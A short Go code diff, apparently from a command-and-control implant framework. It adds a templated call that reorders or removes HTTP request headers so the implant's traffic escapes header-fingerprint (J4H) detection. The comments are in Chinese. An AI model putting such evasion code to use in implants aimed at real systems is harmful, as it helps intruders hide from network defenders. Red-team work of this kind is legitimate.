@@ -77,6 +77,11 @@ func GoHTTPDriver(origin string, secure bool, opts *HTTPOptions) (HTTPDriver, er
 	// 代理隧道由 utlsDialTLSContext 内部自行建立。
 	transport.DialTLSContext = utlsDialTLSContext(opts, proxyURL)
 	// {{end}}
+	// {{if or .HTTPC2ImplantConfig.HttpHeaderOrder .HTTPC2ImplantConfig.HttpSuppressHeaders}}
+	// HTTP 请求头块指纹(J4H):包装连接以在写方向重排/删除头。
+	// 必须在 uTLS 安装之后,才能包裹其返回的 uTLS 连接(改写发生在加密前)。
+	installRequestFingerprint(transport, opts, proxyURL, secure)
+	// {{end}}
 	return client, nil
 }
 
